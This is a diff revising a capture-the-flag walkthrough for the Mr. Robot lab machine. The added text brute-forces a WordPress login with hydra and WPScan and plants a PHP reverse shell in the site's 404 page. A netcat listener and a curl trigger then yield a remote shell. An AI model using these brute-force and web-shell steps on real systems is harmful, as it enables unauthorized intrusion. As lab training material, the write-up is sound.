@@ -84,7 +84,7 @@ kali@kali$ nikto -h 10.38.1.111
 + /wordpresswp-login.php: Wordpress login found
 + 7915 requests: 0 error(s) and 19 item(s) reported on remote host
 ```
-**Nikto** has discovered that the server is running an instance of **Wordpress**.
+**Nikto** has discovered that the server is running an instance of **WordPress**.
 
 ![wordpress](https://www.dropbox.com/s/qfke2r46f8cjcgc/wplogin.jpg?dl=1)
 
@@ -107,7 +107,7 @@ kali@kali$ nikto -h 10.38.1.111
 > A [robots.txt](https://developers.google.com/search/docs/advanced/robots/intro) file tells search engine crawlers which URLs the crawler can access on your site.
 > This is used mainly to avoid overloading your site with requests; it is not a mechanism for keeping a web page out of Google.
 
-`robots.txt` indicates that the server doesn't have an user agent but it has two files:
+`robots.txt` indicates that the server doesn't have an user agent, but it has two files:
 
 ![robots](https://www.dropbox.com/s/49gd4p8jxetp3tu/robots.jpg?dl=1)
 
@@ -127,7 +127,7 @@ kali@kali$ cat key-1-of-3.txt
 
 ## Second Flag
 
-As SSL isn't enabled on the Wordpress login page, it may be bruteforced with the previously acquired dictionary file.
+As SSL isn't enabled on the WordPress login page, it may be bruteforced with the previously acquired dictionary file.
 
 `fsocity.dic` contains duplicated entries that should be removed.
 
@@ -147,21 +147,32 @@ kali@kali$ wc -l wordlist.dic
 11451 wordlist.dic
 ```
 
-To start the bruteforce attack, we need to intercept an [http POST request](<https://en.wikipedia.org/wiki/POST_(HTTP)>) in [Burp Suite](https://portswigger.net/burp).
+### POST request
 
-To do that, a manual proxy must be configured in the browser and Burp Suite should have the same Proxy Listener set:
+To start the bruteforce attack, we need to intercept an http POST request in [Burp Suite](https://portswigger.net/burp).
 
-![proxy](https://www.dropbox.com/s/gmy9hh0pjqyqwgz/proxy.jpg?dl=1)
 
-![burpsuite-proxy](https://www.dropbox.com/s/3hbxquuwh8v10ba/burpsuite.jpg?dl=1)
+> The [POST request](https://en.wikipedia.org/wiki/POST_(HTTP)) method requests that a web server accept the data enclosed in the body of the request message, most likely for storing it.
+> It is often used when uploading a file or when submitting a completed web form _(e.g. login form)_.
+
+To do that, a manual proxy must be configured in the browser (FireFox) and Burp Suite should have the same proxy listener set:
+
+![proxy-browser](https://www.dropbox.com/s/gmy9hh0pjqyqwgz/proxy.jpg?dl=1)
+
+![proxy-burpsuite](https://www.dropbox.com/s/5256rk1t5vthmws/burpsuite-proxy.png?dl=1)
+
+To intercept the http POST request, I have filled the WordPress login form with random credentials:
+
+- **Username**: Test
+- **Password**: Password123
 
 ![burpsuite](https://www.dropbox.com/s/a6ay1bq6thlap7m/burpsuite.png?dl=1)
 
-In the intercepted POST request - that has been sent to the server - we're looking for the `log`, `pwd`, and the `wp-submit` fields.
+In the intercepted POST request - that has been sent to the server - we're interested in the `log`, `pwd`, and the `wp-submit` fields.
 
 ### Hydra
 
-**hydra** can be used to guess the username:
+Based on the captured POST request, we can use **hydra** to guess the username:
 
 ```sh
 kali@kali$ hydra -V -L fsocity.dic -p 123 10.38.1.111 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
@@ -184,9 +195,9 @@ kali@kali$ hydra -V -L fsocity.dic -p 123 10.38.1.111 http-post-form '/wp-login.
 
 **hydra** has found 3 possible usernames: `elliot`, `Elliot` and `ELLIOT`.
 
-#### Wpscan
+### WPScan
 
-**wpscan** can be used to find additional WordPress vulnerabilities and to bruteforce the password using the word list.
+**WPScan** can be used to find additional WordPress vulnerabilities and to bruteforce the password using the word list.
 
 ```sh
 kali@kali$ wpscan --url 10.28.1.111 --passwords /home/kali/mrrobot/wordlist.dic --usernames Elliot
@@ -202,12 +213,56 @@ Progress Time: 00:00:19 <=======================================================
  | Username: Elliot, Password: ER28-0652
 ```
 
-**wpscan** has found several outdated plugins and one valid username - password pair.
+**WPScan** has found several outdated plugins and one valid username - password pair.
 
-### Metasploit
+Testing the credentials, we can log in to the WordPress administration interface indeed.
 
-**Metasploit** [WordPress Admin Shell Upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module creates a small WordPress plugin that connects back to the attacking machine and spawns a reverse shell.
+### Reverse shell
+
+> A **reverse shell** is a shell session established on a connection that is initiated from the victim's remote machine, not from the attacker’s host.
+> Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session (gain access) on the target machine.
+
+I've downloaded a basic PHP reverse shell code from [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell).
+
+Prior to uploading the PHP code, the attacking machine's IP address must be assigned to the `$ip` variable.
+
+```php
+$ip = '10.38.1.110';  // CHANGE THIS
+```
+
+As we can log in to the WordPress site with the acquired credentials, the PHP reverse shell code can be included in a PHP file that already exists.
+
+I have replaced PHP code in the site's 404 page - loading the 404 page, will now will execute the PHP reverse shell code.
+
+> [404](https://en.wikipedia.org/wiki/HTTP_404) is an HTTPS standard response code, to indicate that the browser was able to communicate with a given server, but the server could not find what was requested.
+
+**netcat** now is being used to listen to every incoming connections on port `1234`.
 
 ```sh
-kali@kali$ msfconsole
+kali@kali$ netcat -lvp 1234
+listening on [any] 1234 ...
+```
+
+To start the reverse shell, the 404 page can be called with **curl** in another terminal instance.
+
+```sh
+kail@kali$ curl http://10.38.1.111/404.php
+```
+
+
+
+```sh
+10.38.1.111: inverse host lookup failed: Host name lookup failure
+connect to [10.38.1.110] from (UNKNOWN) [10.38.1.111] 41282
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 02:06:59 up 1 min,  0 users,  load average: 0.03, 0.01, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+
+```sh
+$ id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
 ```
